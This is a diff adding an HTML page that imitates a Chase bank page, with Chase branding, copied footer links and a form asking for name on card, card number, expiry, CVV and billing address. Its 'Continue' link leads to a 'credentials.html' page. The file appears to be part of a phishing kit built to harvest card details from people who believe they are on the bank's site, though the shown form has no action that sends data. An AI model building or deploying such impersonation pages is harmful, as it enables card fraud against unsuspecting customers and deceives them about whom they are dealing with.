@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+          <meta charset="UTF-8">
+          <meta http-equiv="X-UA-Compatible" content="IE=edge">
+          <meta name="viewport" content="width=device-width, initial-scale=1.0">
+          <link rel="stylesheet" href="main.css">
+          <link rel="stylesheet" href="./fontsawesome/css/all.css">
+          <link rel="stylesheet" href="./mobile.css">
+          <title>Document</title>
+</head>
+<body>
+          <header>
+                    <main>
+                              <div class="logo">
+                                        <h1>CHASE  <i class="fa-brands fa-instalod"></i></h1>
+                              </div>
+          
+
+
+                              <form action="">
+                                        <label>
+                                                  <br>
+                                                  <input type="text" name="" id="nameoncard" placeholder="Name on card" autocomplete="cc-name" required>
+                                        </label> <br>
+                                        <label for="">
+                                                  <input type="text" class="ccFormatMonitor" placeholder="Card Number" maxlength="18" name="cc" autocomplete="cc-number" onBlur="myFunc()" id="cc" required>
+                                        </label>
+                                        <label for="">
+                                                  <input maxlength='5' placeholder="MM/YY" type="text" onkeyup="formatString(event);" required>
+                                        </label>
+                                        <label for="">
+                                                  <input type="password" class="cvv" placeholder="CVV" maxlength="3" autocomplete="" required> <br>
+                                        </label>
+                                        <label for="">
+                                                  <input type="text" id="b-a" placeholder="Billing Address" required>
+                                        </label>
+                                        <label id="states" >
+                                        
+                                                   <select id="state-list" required>
+                                                     <option value="">Select State</option>
+                                                             <option value="AL">Alabama</option>
+                                                             <option value="AK">Alaska</option>
+                                                             <option value="AZ">Arizona</option>
+                                                             <option value="AR">Arkansas</option>
+                                                             <option value="CA">California</option>
+                                                             <option value="CO">Colorado</option>
+                                                             <option value="CT">Connecticut</option>
+                                                             <option value="DE">Delaware</option>
+                                                             <option value="DC">District Of Columbia</option>
+                                                             <option value="FL">Florida</option>
+                                                             <option value="GA">Georgia</option>
+                                                             <option value="HI">Hawaii</option>
+                                                             <option value="ID">Idaho</option>
+                                                             <option value="IL">Illinois</option>
+                                                             <option value="IN">Indiana</option>
+                                                             <option value="IA">Iowa</option>
+                                                             <option value="KS">Kansas</option>
+                                                             <option value="KY">Kentucky</option>
+                                                             <option value="LA">Louisiana</option>
+                                                             <option value="ME">Maine</option>
+                                                             <option value="MD">Maryland</option>
+                                                             <option value="MA">Massachusetts</option>
+                                                             <option value="MI">Michigan</option>
+                                                             <option value="MN">Minnesota</option>
+                                                             <option value="MS">Mississippi</option>
+                                                             <option value="MO">Missouri</option>
+                                                             <option value="MT">Montana</option>
+                                                             <option value="NE">Nebraska</option>
+                                                             <option value="NV">Nevada</option>
+                                                             <option value="NH">New Hampshire</option>
+                                                             <option value="NJ">New Jersey</option>
+                                                             <option value="NM">New Mexico</option>
+                                                             <option value="NY">New York</option>
+                                                             <option value="NC">North Carolina</option>
+                                                             <option value="ND">North Dakota</option>
+                                                             <option value="OH">Ohio</option>
+                                                             <option value="OK">Oklahoma</option>
+                                                             <option value="OR">Oregon</option>
+                                                             <option value="PA">Pennsylvania</option>
+                                                             <option value="RI">Rhode Island</option>
+                                                             <option value="SC">South Carolina</option>
+                                                             <option value="SD">South Dakota</option>
+                                                             <option value="TN">Tennessee</option>
+                                                             <option value="TX">Texas</option>
+                                                             <option value="UT">Utah</option>
+                                                             <option value="VT">Vermont</option>
+                                                             <option value="VA">Virginia</option>
+                                                             <option value="WA">Washington</option>
+                                                             <option value="WV">West Virginia</option>
+                                                             <option value="WI">Wisconsin</option>
+                                                             <option value="WY">Wyoming</option>
+                                                   </select>
+                                                   <input type="text" id="c-y" placeholder="City" required>
+                                         </label>
+
+                                         <label id="zipcode">
+                                               
+                                                  <input id="zip" name="zip" type="text" pattern="[0-9]*" placeholder="Zip Code" required>
+                                            </label>
+                                            <select id="country" name="country" class="form-control">
+                                                  <option value="United States">United States</option>
+                                            </select>
+
+                                            <button type="submit"> <a href="./credentials.html"> Continue</a></button>
+
+
+                              </form>
+                    </main>
+          </header>
+          <footer>
+                    <div class="foot">
+
+                              <div class="social-links">
+                                     
+          
+                                               <p>  Follow Us:</p> 
+                                     
+                                               <div class="social">
+          
+                                                         <div class="fa">
+                            
+                                                                   <i class="fa-brands fa-square-facebook"></i>
+                                                         </div>
+                                                         <div class="ins">
+                            
+                                                                   <i class="fa-brands fa-square-instagram"></i>
+                                                         </div>
+                                                         <div class="twi">
+                            
+                                                                   <i class="fa-brands fa-twitter"></i>
+                                                         </div>
+                                                         <div class="you">
+                            
+                                                                   <i class="fa-brands fa-youtube"></i>
+                                                         </div>
+                                                         <div class="lin">
+                            
+                                                                   <i class="fa-brands fa-linkedin-in"></i>
+                                                         </div>
+                                               </div>
+                              </div>
+                    </div>
+<div class="line">
+
+</div>
+
+          <div class="links-2">
+                              <li><a href="">Contacts</a></li>
+                              <li><a href="">Privacy</a></li>
+                              <li><a href="">Security</a></li>
+                              <li><a href="">Terms of Use</a></li>
+                              <li><a href="">Accessibility</a></li>
+                              <li><a href="">Safe Act: Chase Mortgage Loan Originators</a></li>
+                              <li><a href="">Fair Lending</a></li>
+                              <li><a href="">About Chase</a></li>
+                              <li><a href="">J.P. Morgan</a></li>
+                              <li><a href="">JP Morgan Chase & Co.</a></li>
+                              <li><a href="">Careers</a></li>
+                              <li><a href="">Español</a></li>
+                              
+          </div>
+<div class="links-3">
+          <li><a href="">Chase Canada</a></li>
+          <li><a href="">Site map</a></li>
+          <li><a href="">Member FDIC</a></li>
+          <li><a href="">Equal Housing Lender</a></li>
+</div>
+          <p id="copy"> &copy; 2016 JPMorgan Chase & Co</p>
+
+          </footer>
+
+<script>
+                  function formatString(e) {
+  var inputChar = String.fromCharCode(event.keyCode);
+  var code = event.keyCode;
+  var allowedKeys = [8];
+  if (allowedKeys.indexOf(code) !== -1) {
+    return;
+  }
+  event.target.value = event.target.value.replace(
+    /^([1-9]\/|[2-9])$/g, '0$1/' // 3 > 03/
+  ).replace(
+    /^(0[1-9]|1[0-2])$/g, '$1/' // 11 > 11/
+  ).replace(
+    /^([0-1])([3-9])$/g, '0$1/$2' // 13 > 01/3
+  ).replace(
+    /^(0?[1-9]|1[0-2])([0-9]{2})$/g, '$1/$2' // 141 > 01/41
+  ).replace(
+    /^([0]+)\/|[0]+$/g, '0' // 0/ > 0 and 00 > 0
+  ).replace(
+    /[^\d\/]|^[\/]*$/g, '' // To allow only digits and `/`
+  ).replace(
+    /\/\//g, '/' // Prevent entering more than 1 `/`
+  );
+
+  }
+
+
+  function myFunc() {
+   var patt = new RegExp("\d{4}[\-]\d{4}[\-]\d{4}[\-]\d{4}");
+   var x = document.getElementById("cc");
+   var res = patt.test(x.value);
+   if(!res){
+    x.value = x.value
+        .match(/\d*/g).join('')
+        .match(/(\d{0,4})(\d{0,4})(\d{0,4})(\d{0,4})/).slice(1).join('-')
+        .replace(/-*$/g, '');
+   }
+}
+
+
+
+
+
+
+
+</script>
+
+</body>
+</html>
